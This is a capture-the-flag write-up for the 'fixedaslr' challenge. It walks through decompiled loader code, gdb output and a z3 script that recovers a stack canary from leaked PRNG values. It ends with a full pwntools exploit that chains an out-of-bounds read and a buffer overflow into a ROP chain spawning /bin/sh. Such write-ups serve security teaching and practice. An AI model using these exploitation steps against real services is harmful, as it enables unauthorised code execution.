1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ulong aslr_get_addr ( int param_1 ) { int iVar1 ; undefined4 extraout_var ; ulong uVar2 ; ulong uVar3 ; while ( true ) { iVar1 = rand (); uVar2 = CONCAT44 ( extraout_var , iVar1 ) << 0x1c ; uVar3 = sys_mmap ( uVar2 , param_1 << 0xc , 3 , 0x100022 , 0 , 0 ); if ( uVar3 < 0xfffffffffffff000 ) break ; puts ( "note: candidate address occupied" ); } if ( uVar3 != uVar2 ) { die ( "No idea. Should not happen." ); } sys_munmap ( uVar3 , param_1 << 0xc ); return uVar3 ; }

Checking through the assembly, the edi is set to 0xc before calling the rand() method.

Now we have found the custom aslr method! Turn out, the way it does the ASLR is, it will call rand() method to get 12-bits (0xc) of a random number, and use this value as the first 12-bit base address of the loaded object file. After getting this base address, later on, the object file method will be mapped to the generated address.

And checking through Ghidra, after initializing the canary stack value, rand() will be only called during assigning the aslr of the loaded object via this method. You can see in below picture that rand() is only used in init_stack_guard (0x402163) and aslr_get_addr (0x40160c) method.

Remember from the previous analysis, that if we somehow manage to get the n rand() call values after the call of init_stack_guard , we might be able to recover the rand_state after the init_stack_guard call, which is equivalent to the canary value set in our binary. And turn out, each of the n rand() call values is used as the aslr base address of each loaded file.

So, if we’re somehow able to retrieve these aslr addresses (which is constructed from the rand() value result), it will be great for us, because that means we will be able to recover consecutive rand() results, where the rand() call is based on a rand_state that is equivalent to the canary value. And using these recovered values, we will try to reconstruct the initial rand_state (which is our canary ).

To summarize, loader will load 7 object files (because we were given 7 object files in the challenge), which means there will be 7 consecutive calls to rand() after the rand_state is equivalent to canary value. And our target is to leak these 7 aslr addresses.

Run the main program

Well yeah, after the loader finished all of its object files, it will run the main program, which run the methods defined in the game.o file.

Exploitation Plan

Now we have finished our initial analysis, we will need to craft a plan. From the above initial analysis, what we have gathered so far:

We can leak the canary value if we’re able to retrieve the rand() results of the aslr_get_addr value, which is the aslr base address of each loaded object file region.

value if we’re able to retrieve the results of the value, which is the aslr base address of each loaded object file region. There is BOF in the get_player_name method. This indicates that to be able to perform ROP, we will need to play the game until we got into the scoreboard + we need canary value.

method. There is OOB in the see_scoreboard method. We need to be able to leak some useful values Hopefully, with this OOB, we can leak the rand() results.

method.

Recover rand() value

Our first step will be recovering the rand() values which are used as the aslr of each loaded object region.

So, let’s try to set up our gdb and then explore how the values are initialized. This is my breakpoint setup

1 2 b *init_stack_guard+85 b *aslr_get_addr+37

The first breakpoint will be used to get the canary value just for sanity checking. The second breakpoint will be used to retrieve the rand() result of the aslr method.

Let’s try stepping on the gdb.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 $ rax : 0x75924ac4cc2d256a $ rbx : 0x0 $ rcx : 0x3a $ rdx : 0x75924ac4cc2d256a $ rsp : 0x007fffffffdcb8 → 0x0000000000000008 $ rbp : 0x007fffffffdcc8 → 0x007fffffffdcf8 → 0x0000000000000000 $ rsi : 0x007ffff7ff8000 → 0x0000000000000000 $ rdi : 0x3a $ rip : 0x00000000402168 → < init_stack_guard + 85 > mov rdi , rax $ r8 : 0x0 $ r9 : 0x0 $ r10 : 0x22 $ r11 : 0x206 $ r12 : 0x0 $ r13 : 0x0 $ r14 : 0x0 $ r15 : 0x0 $ eflags : [ ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification ] $ cs : 0x33 $ ss : 0x2b $ ds : 0x00 $ es : 0x00 $ fs : 0x00 $ gs : 0x00 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x007fffffffdcb8 │ + 0x0000 : 0x0000000000000008 ← $ rsp 0x007fffffffdcc0 │ + 0x0008 : 0x007ffff7ff8000 → 0x0000000000000000 0x007fffffffdcc8 │ + 0x0010 : 0x007fffffffdcf8 → 0x0000000000000000 ← $ rbp 0x007fffffffdcd0 │ + 0x0018 : 0x000000004023e8 → < _start + 42 > mov DWORD PTR [ rbp - 0x4 ], 0x0 0x007fffffffdcd8 │ + 0x0020 : 0x0000000000000000 0x007fffffffdce0 │ + 0x0028 : 0x0000000000000000 0x007fffffffdce8 │ + 0x0030 : 0x0000000000000000 0x007fffffffdcf0 │ + 0x0038 : 0x0000000000000000 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code : x86 : 64 ──── 0x402159 < init_stack_guard + 70 > call 0x40100d < syscall2 > 0x40215e < init_stack_guard + 75 > mov edi , 0x40 0x402163 < init_stack_guard + 80 > call 0x40146c < rand > → 0x402168 < init_stack_guard + 85 > mov rdi , rax 0x40216b < init_stack_guard + 88 > call 0x401064 < write_stack_guard > 0x402170 < init_stack_guard + 93 > nop 0x402171 < init_stack_guard + 94 > leave 0x402172 < init_stack_guard + 95 > ret 0x402173 < pivot_to_main + 0 > endbr64 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [ #0] Id 1, Name: "loader", stopped 0x402168 in init_stack_guard (), reason: BREAKPOINT ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [ #0] 0x402168 → init_stack_guard() ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── gef ➤

We hit our first breakpoint, and rax is the canary value.

Let’s continue and take notes on the rax value on each breakpoint because it is the rand() result. I won’t display the result here because it’s too long.

After stepping 7 times, these are the rand() consecutive results (which are retrieved from rax values on each break).

1 0x42f, 0xf90, 0x97e, 0x7ab, 0xc92, 0x6fe, 0xf0b

Now, let’s check the vmmap to confirm that this 12-bits number is indeed used as the base address of each loaded object.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 gef ➤ vmmap [ Legend : Code | Heap | Stack ] Start End Offset Perm Path 0x000042f0000000 0x000042f0002000 0x00000000000000 r - x 0x000042f0002000 0x000042f0004000 0x00000000000000 rw - 0x000042f0004000 0x000042f0005000 0x00000000000000 r -- 0x00006fe0000000 0x00006fe0001000 0x00000000000000 r - x 0x00006fe0001000 0x00006fe0003000 0x00000000000000 r -- 0x00007ab0000000 0x00007ab0002000 0x00000000000000 r - x 0x00007ab0002000 0x00007ab0004000 0x00000000000000 r -- 0x000097e0000000 0x000097e0002000 0x00000000000000 r - x 0x000097e0002000 0x000097e0004000 0x00000000000000 r -- 0x0000c920000000 0x0000c920002000 0x00000000000000 r - x 0x0000c920002000 0x0000c920003000 0x00000000000000 rw - 0x0000c920003000 0x0000c920005000 0x00000000000000 r -- 0x0000f0b0000000 0x0000f0b0002000 0x00000000000000 r - x 0x0000f0b0002000 0x0000f0b0003000 0x00000000000000 r -- 0x0000f900000000 0x0000f900002000 0x00000000000000 r - x 0x0000f900002000 0x0000f900003000 0x00000000000000 r -- 0x007ffff7ff7000 0x007ffff7ff8000 0x00000000000000 r - x 0x007ffff7ff8000 0x007ffff7ff9000 0x00000000000000 rw - 0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r -- [ vvar ] 0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r - x [ vdso ] 0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw - [ stack ] 0xffffffffff600000 0xffffffffff601000 0x00000000000000 -- x [ vsyscall ]

Yes it is. Notice that most of the region addresses’ first 12-bits in the vmmap is our rand() result. Now, our goal is to recover these addresses via the OOB bug.

Playing around the gdb, we notice that putting 512 as the scoreboard offset will leak our 1st rand result.

1 2 3 4 5 6 Which place's score do you want to see (0-9)? 512 To get this place you need to beat this score: 287494381664 --- In [260]: hex(287494381664) Out[260]: '0x42f0002060'

Notice that the first 12-bits of the number are the rand() result (Specifically the first rand() result after rand_state = canary ). So basically our goal is with this OOB, we will try to leak all the aslr addresses generated by the rand() method.

Also, we actually can use a negative index. But we need to convert it to unsigned first. For example, if you want to put -1 , then send 2**64-1 as the offset value.

After playing throughout the gdb, we notice a consistent pattern on each run, which we will explain below:

Offset 512 -> Leak the 1st rand() result ( base_1 region address)

region address) Offset -1017 -> Leak the 3rd rand() result ( base_3 region address)

region address) Offset -1019 -> Leak the 5th rand() result ( base_5 region address)

region address) After leaking the 5th rand(), we notice that the address region started with the 5th rand() ’s value contains the 4th and 6th rand() ’s results. So subtracting the 5th leaked address with the 1st leaked address can leak the 4th and 6th rand() value.

’s value contains the 4th and 6th ’s results. So subtracting the 5th leaked address with the 1st leaked address can leak the 4th and 6th value. After leaking the 4th rand() , we notice that the address region started with the 4th rand() s value contains the 2nd rand() result. So subtracting the 4th leaked with the 1st leaked can leak the 2nd rand() value.

You can see my shared script later if you’re quite confused, but, basically, with correct OOB offsets, we managed to leak the first 6 of the aslr addresses where the first 12-bit of each address is generated by rand() .

Recover canary value

Now that we have leaked 6 consecutive of the rand() values, this is actually enough to recover our canary value. How to do this? Just translate the rand() method to python and put it in z3 😂. z3 is an SMT solver. Given some constraints, it will try to check whether any solution that can satisfy the constraints exists or not.

In this case, the constraints that we will use are the leaked rand() values, while the solution that we try to find is a 64-bit number (which is the rand_state ). So, what we can do is simply re-write the rand() algorithm that we see in the decompiled result to python, and then try to construct the constraints for our target solution ( rand_state ) by adding equality constraint, where each rand() call result need to be equal to our leaked value.

Here is the sample POC, where we will use the previous value that we get from GDB.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 from pwn import * from z3 import * # Sanity check real_canary = 0x75924ac4cc2d256a known_states7 = 0xf0b # For POC, we will use only 6 of the rand() values, because we can only recover 6 rand() values # based on previous analysis known_states = [ 0x42f , 0xf90 , 0x97e , 0x7ab , 0xc92 , 0x6fe ] s = Solver () # Rand state is a 64-bit value rand_state = BitVec ( "x" , 64 ) def rand_extract_bit ( a ): global rand_state return ( rand_state >> a ) & 1 def rand_get_bit (): global rand_state x = ( rand_extract_bit ( 0x3F ) ^ rand_extract_bit ( 0x3D ) ^ rand_extract_bit ( 0x3C ) ^ rand_extract_bit ( 0x3A ) ^ 1 ) rand_state = (( rand_state << 1 ) % ( 2 ** 64 )) | x return x def rand ( n ): x = 0 for i in range ( n ): y = rand_get_bit () x = ( x << 1 ) | y return x # Setting constraints, where each rand() call result # should be the same as the leaked rand() values for known_state in known_states : s . add ( rand ( 0xc ) == known_state ) # Solve the equations with z3 by checking whether the solver # can satisfy the constraint recovered_canary = 0 if s . check () == sat : # If yes, that mean z3 found the solution, which basically our # canary value. model = s . model () recovered_canary = model [ BitVec ( "x" , 64 )] . as_long () # Check whether the recoverd rand_state (canary) is the same as what # we got from GDB value. log . info ( f 'Known states : { known_states } ' ) log . info ( f 'Real canary : { hex ( real_canary ) } ' ) log . info ( f 'Recovered canary: { hex ( recovered_canary ) } ' ) # Now we have recovered the canary (rand_state), let's calculate # the address of the 7th rand() result. Inspecting via gdb, this # 7th address contains a lot of useful gadgets. # Recover 7th address rand_state = recovered_canary recovered_known_state7 = 0 for i in range ( 7 ): recovered_known_state7 = rand ( 12 ) # Check whether thhe recovered 7th rand() value is the same as what # we got from GDB value. log . info ( f 'Real Addr 7th : { hex ( known_states7 ) } ' ) log . info ( f 'Recovered Addr : { hex ( recovered_known_state7 ) } ' )

Executing the above POC will be proof that z3 is able to recover the canary value. Also after we recovered the initial rand_state , we can simply get the 7th rand() by calling rand() 7 times. This will be useful later! Below is the POC result.

1 2 3 4 5 [*] Known states : [1071, 3984, 2430, 1963, 3218, 1790] [*] Real canary : 0x75924ac4cc2d256a [*] Recovered canary: 0x75924ac4cc2d256a [*] Real Addr 7th : 0xf0b [*] Recovered Addr : 0xf0b

Leverage the BOF bug to perform RCE

Now we have POC to recover our canary value, we can use the BOF bug to perform RCE by overwriting the saved return pointer. One of the common techniques to achieve RCE via BOF is called return oriented programming (ROP).

What we need to do is, because we control the stack due to the buffer overflow bug, we will try to carefully choose some available instructions in the binary (called gadgets ), which can be used to build our shellcode. Usually, what we’re looking for is an instruction that can pop a stack value (which we can control) to chosen register (such as rdi , rsp , rsi , rax , etc.), and it usually ends with ret instruction, so that we can jump to another chosen instruction that we have put in the stack.

For example, imagine that we have a buffer overflow bug in method X:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 Now because of our malicious input, the stack layout become like below: Lower Address ---------------------------------- | aaaaaaaa | <- RSP, top of stack |----------------------------------| | ........ | |----------------------------------| | Saved RBP | <- RBP |----------------------------------| | Address of gadget "pop rdi; ret" | <- Stack Return Pointer address after being overwritten |----------------------------------| | desired rdi value | |----------------------------------| | Address of gadget "syscall" | ---------------------------------- Higher Address When the method X is finished and want to jump to the previous callee by calling `leave; ret;`, the stack flow will be like below: After "leave", stack will be like below: Lower Address ---------------------------------- | Address of gadget "pop rdi; ret" | <- RSP. Stack Return Pointer address after being overwritten |----------------------------------| | desired rdi value | <- This value will be popped to rdi |----------------------------------| | Address of gadget "syscall" | ---------------------------------- Higher Address During executing "ret", program will do "pop rip", which basically make the program jump to the address stored in top of stack, which is "pop rdi; ret". Now the stack is like below: Lower Address ---------------------------------- | desired rdi value | <- RSP. This value will be popped to rdi |----------------------------------| | Address of gadget "syscall" | ---------------------------------- Higher Address Now, during executing "pop rdi", it will pop top of stack to rdi. Now stack is like below: Lower Address ---------------------------------- | Address of gadget "syscall" | <- RSP. Next return pointer address ---------------------------------- Higher Address And now, "ret" will do "pop rip", which make the program jump to the stored address in RSP , which is syscall. Now, We finally able to do RCE leveraging BOF bug.

As you can see in the above example, with buffer overflow, we can do RCE via ROP to execute our desired execution.

So, the last step is only to build a ROP chain. Inspecting via gdb, we notice that the 7th rand() address region contains a lot of gadgets that we can use (Such as pop rdi; ret; , pop rsi; ret , pop rax; ret ). We also notice in the 2nd rand() address region, there is syscall gadget.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // Lot of useful gadgets found in 7th address region gef➤ x/25i 0x00000f0b001000 0xf0b001000: push rdi 0xf0b001001: pop rdi 0xf0b001002: ret 0xf0b001003: push rdi 0xf0b001004: pop rsi 0xf0b001005: ret 0xf0b001006: push rdi 0xf0b001007: pop rax 0xf0b001008: ret // Syscall found in 2nd address region gef➤ x/10i 0x0000f900001000 0xf900001000: mov eax,edi 0xf900001002: syscall 0xf900001004: ret

We plan to use these gadgets to do syscall execve('/bin/sh') . The rough plan is to build a ROP chain to do this:

pop “/bin/sh\x00” pointer to rdi

pop null to rsi

pop execve syscall number (0x3b) to rax

syscall number (0x3b) to call syscall

Solution

Following the above exploitation plan, below is the full script that I used to execute the plan. I’ve provided detailed comments to explain what the script does.

Info Notes that sometimes z3 couldn’t recover the correct canary value, but we simply retry it, and at somepoint, it will be able to recover the correct canary .

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 from pwn import * from pwn import p64 , u64 , p32 , u32 from z3 import * context . arch = 'amd64' context . encoding = 'latin' context . log_level = 'INFO' warnings . simplefilter ( "ignore" ) # Helper method to execute the OOB bug def oob ( r , offset ): r . sendlineafter ( b 'Your choice?

' , b '3' ) r . sendlineafter ( b 'see (0-9)?

' , str ( offset ) . encode ()) r . recvuntil ( b 'score: ' ) return int ( r . recvuntil ( b '

' ) . strip ()) # Helper method to put our score into the scoreboard # and put our BOF payload def play ( r , n , payload ): r . sendlineafter ( b 'Your choice?

' , b '1' ) for i in range ( n ): r . recvuntil ( b 'How much is ' ) out = r . recvuntil ( b ' ?

' ) . strip ()[: - 2 ] ans = eval ( out ) log . info ( f 'Question- { i + 1 } : { out . decode () } = { ans } ' ) r . sendline ( str ( ans ) . encode ()) r . recvuntil ( b 'How much is ' ) out = r . recvuntil ( b ' ?

' ) . strip ()[: - 2 ] ans = eval ( out ) + 5 # Make it false log . info ( f 'Question- { i + 2 } : { out . decode () } = { ans } ' ) r . sendline ( str ( ans ) . encode ()) r . sendlineafter ( b '(0-31)?

' , str ( len ( payload )) . encode ()) r . sendafter ( b 'your name:' , payload ) r . interactive () def conn (): if args . LOCAL : r = process ([ './loader' ], env = {}) if args . PLT_DEBUG : gdb . attach ( r , gdbscript = '''''' ) else : r = remote ( b 'fixedaslr.2022.ctfcompetition.com' , 1337 ) return r r = conn () ''' Recover the rand_state during the first rand() call of aslr_get_addr, which equivalent to the canary value set by init_stack_guard method. We use the OOB bug on scoreboard. Notes that we can only recover 6 of rand() result of the aslr_get_addr method. Each rand() return 12-bit number, which is used as the first 12-bits of each address those used by each object file in this challenge. ''' known_states = [ 0 , 0 , 0 , 0 , 0 , 0 ] # Inspecting via gdb, offset 512 will give us the 1st rand() # result of the aslr_get_addr (taking the first 12-bits only) base_1 = oob ( r , 512 ) known_states [ 0 ] = base_1 >> 28 # Inspecting via gdb, offset -1017 will give us the 3rd rand() # result of the aslr_get_addr (taking the first 12-bits only) known_states [ 2 ] = oob ( r , 2 ** 64 - 1017 ) >> 28 # Inspecting via gdb, offset -1019 will give us the 5th rand() # result of the aslr_get_addr (taking the first 12-bits only) base_5 = oob ( r , 2 ** 64 - 1019 ) known_states [ 4 ] = base_5 >> 28 # Inspecting via gdb, one of the address in region started with the 5th result # of the rand() contains an address which the first 12-bits is # the result of the 4th rand() offset_4 = int ((( base_5 - 0x1000 + 8 ) - ( base_1 - 0x60 )) // 8 ) if offset_4 < 0 : offset_4 = 2 ** 64 + offset_4 base_4 = oob ( r , offset_4 ) known_states [ 3 ] = base_4 >> 28 # Inspecting via gdb, one of the address in region started with the 5th result # of the rand() also contains an address which the first 12-bits is # the result of the 6th rand() offset_6 = int ((( base_5 + 0x1000 ) - ( base_1 - 0x60 )) // 8 ) if offset_6 < 0 : offset_6 = 2 ** 64 + offset_6 base_6 = oob ( r , offset_6 ) known_states [ 5 ] = base_6 >> 28 # Inspecting via gdb, one of the address in region started with the 4th result # of the rand() also contains an address which the first 12-bits is # the result of the 2nd rand() offset_2 = int ((((( base_4 >> 16 ) << 16 ) + 0x38 ) - ( base_1 - 0x60 )) // 8 ) base_2 = oob ( r , offset_2 ) known_states [ 1 ] = base_2 >> 28 # Now we have 6 consecutives rand() result, we will try to recover # the rand_state before the first rand(), which equivalents to # the binary canary value. # We use z3 to solve it. s = Solver () log . info ( f 'Known states: { known_states } ' ) rand_state = BitVec ( "x" , 64 ) def rand_extract_bit ( a ): global rand_state return ( rand_state >> a ) & 1 def rand_get_bit (): global rand_state x = ( rand_extract_bit ( 0x3F ) ^ rand_extract_bit ( 0x3D ) ^ rand_extract_bit ( 0x3C ) ^ rand_extract_bit ( 0x3A ) ^ 1 ) rand_state = (( rand_state << 1 ) % ( 2 ** 64 )) | x return x def rand ( n ): x = 0 for i in range ( n ): y = rand_get_bit () x = ( x << 1 ) | y return x for known_state in known_states : s . add ( rand ( 0xc ) == known_state ) recovered_canary = 0 if s . check () == sat : model = s . model () recovered_canary = model [ BitVec ( "x" , 64 )] . as_long () log . info ( f 'Recovered canary: { hex ( recovered_canary ) } ' ) # Now we have recovered the canary (rand_state), let's calculate # the address of the 7th rand() result. Inspecting via gdb, this # 7th address contains a lot of useful gadgets. # Recover 7th address rand_state = recovered_canary base_addr7 = 0 for i in range ( 7 ): base_addr7 = rand ( 12 ) base_addr7 = ( base_addr7 << 28 ) + 0x1000 log . info ( f 'Base Addr 7th: { hex ( base_addr7 ) } ' ) # Gadgets from the 7th address region (Gadget can be inspected via gdb) pop_rdi = base_addr7 + 0x1 # pop rdi; ret; pop_rsi = base_addr7 + 0x4 # pop rsi; ret; pop_rax = base_addr7 + 0x7 # pop rax; ret; # Gadgets from the 2nd address region (Gadget can be inspected via gdb) base_addr2 = (( base_2 >> 8 ) << 8 ) syscall = base_addr2 + 0x2 # syscall; # Now we know the canary, we just need to build ROP Chain to exploit # the BOF bug that we found during setting our name in the scoreboard. bin_sh_addr = base_1 + 0x100 # We will put /bin/sh\x00 string into the scoreboard name (which is in base_1+0x100) log . info ( f '/bin/sh addr: { hex ( bin_sh_addr ) } ' ) # BOF payload # - Overwrite saved rbp # - pop bin_sh_addr to rdi. Now rdi contain pointer to b'/bin/sh\x00' string # - pop null to rsi # - pop 0x3b (execve) to rax # - call syscall bof_payload = b '' bof_payload = p64 ( 0 ) + p64 ( pop_rdi ) + p64 ( bin_sh_addr ) + p64 ( pop_rsi ) + p64 ( 0 ) + p64 ( pop_rax ) + p64 ( 0x3b ) + p64 ( syscall ) min_score = 60 // 5 # Score to get to the scoreboard # What this payload do: # - Set /bin/sh\x00 as the start of our name. This will be used by our ROP chain as our execve args. # - Pad it with 0x20 of 'a' # - Put our leaked canary, so that the stack smashing check is passed. # - Overwrite saved rbp of the previous call & return address with our BOF payload play ( r , min_score , p64 ( 0x68732f6e69622f ) + b 'a' * 0x20 + p64 ( recovered_canary ) + bof_payload )

Below is the snapshot of the script result 😄

Flag: CTF{GuessYouCanSayTheCookieGotRandomlyBroken}
